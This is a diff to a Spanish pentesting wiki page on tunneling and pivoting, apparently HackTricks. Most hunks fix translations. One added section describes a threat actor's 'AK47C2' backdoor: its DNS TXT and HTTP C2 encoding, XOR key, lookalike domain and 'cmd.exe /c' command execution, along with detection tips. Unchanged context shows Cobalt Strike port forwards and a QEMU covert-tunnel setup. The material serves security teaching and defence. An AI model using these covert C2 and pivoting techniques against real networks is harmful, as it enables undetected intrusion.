@@ -149,16 +149,16 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host del beacon**, no en el Servidor del Equipo y el tráfico se envía al Servidor del Equipo y desde allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+- El reenvío de puerto inverso de Beacon está diseñado para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
 - El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto inverso en puertos altos.
 
 ### rPort2Port local
 
@@ -348,9 +348,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 Necesitas tener **acceso RDP sobre el sistema**.\
-Descargar:
+Descarga:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunneling packets over the RDP connection**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -452,7 +452,41 @@ Proxychains intercepta la llamada `gethostbyname` de libc y canaliza la solicitu
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## Túnel ICMP
+### C2 personalizado DNS TXT / HTTP JSON (AK47C2)
+
+El actor Storm-2603 creó un **C2 de doble canal ("AK47C2")** que abusa *solo* del tráfico saliente de **DNS** y **HTTP POST** en texto plano – dos protocolos que rara vez son bloqueados en redes corporativas.
+
+1. **Modo DNS (AK47DNS)**
+• Genera un SessionID aleatorio de 5 caracteres (por ejemplo, `H4T14`).
+• Precede `1` para *solicitudes de tarea* o `2` para *resultados* y concatena diferentes campos (flags, SessionID, nombre de computadora).
+• Cada campo está **encriptado con XOR usando la clave ASCII `VHBD@H`**, codificado en hex y unido con puntos – terminando finalmente con el dominio controlado por el atacante:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Las solicitudes utilizan `DnsQuery()` para registros **TXT** (y de respaldo **MG**).
+• Cuando la respuesta excede 0xFF bytes, el backdoor **fragmenta** los datos en piezas de 63 bytes e inserta los marcadores:
+`s<SessionID>t<TOTAL>p<POS>` para que el servidor C2 pueda reordenarlos.
+
+2. **Modo HTTP (AK47HTTP)**
+• Construye un sobre JSON:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Todo el blob es XOR-`VHBD@H` → hex → enviado como el cuerpo de un **`POST /`** con el encabezado `Content-Type: text/plain`.
+• La respuesta sigue la misma codificación y el campo `cmd` se ejecuta con `cmd.exe /c <command> 2>&1`.
+
+Notas del equipo azul
+• Busca consultas **TXT** inusuales cuyo primer etiqueta sea un largo hexadecimal y siempre termine en un dominio raro.
+• Una clave XOR constante seguida de ASCII-hex es fácil de detectar con YARA: `6?56484244?484` (`VHBD@H` en hex).
+• Para HTTP, marca los cuerpos de POST en texto plano que son puro hex y múltiplos de dos bytes.
+
+{{#note}}
+Todo el canal cabe dentro de **consultas estándar compatibles con RFC** y mantiene cada etiqueta de subdominio por debajo de 63 bytes, haciéndolo sigiloso en la mayoría de los registros de DNS.
+{{#endnote}}
+
+## Túneles ICMP
 
 ### Hans
 
@@ -484,7 +518,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
-_URI de exposición son como:_ **UID.ngrok.io**
+_Las URI de exposición son como:_ **UID.ngrok.io**
 
 ### Instalación
 
@@ -555,7 +589,7 @@ El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### Pivot de SOCKS5
+### SOCKS5 pivot
 ```bash
 # Turn the tunnel into a SOCKS5 proxy on port 1080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
@@ -636,7 +670,7 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 ```
 Ejecutar el script con `cscript.exe //B update.vbs` mantiene la ventana oculta.
 
-### Persistencia en el huésped
+### Persistencia en el invitado
 
 Debido a que Tiny Core es sin estado, los atacantes generalmente:
 
@@ -656,10 +690,10 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 • Los productos de seguridad en el host ven **tráfico de loopback benigno** (el C2 real termina dentro de la VM).  
 • Los escáneres de memoria nunca analizan el espacio del proceso malicioso porque vive en un sistema operativo diferente.
 
-### Consejos para defensores
+### Consejos para Defender
 
 • Alertar sobre **binarios inesperados de QEMU/VirtualBox/KVM** en rutas escribibles por el usuario.  
-• Bloquear conexiones salientes que se originen de `qemu-system*.exe`.  
+• Bloquear conexiones salientes que se originen desde `qemu-system*.exe`.  
 • Buscar puertos de escucha raros (2222, 10022, …) que se vinculen inmediatamente después de un lanzamiento de QEMU.
 
 ---
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Referencias
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)  
 
 {{#include ../banners/hacktricks-training.md}}
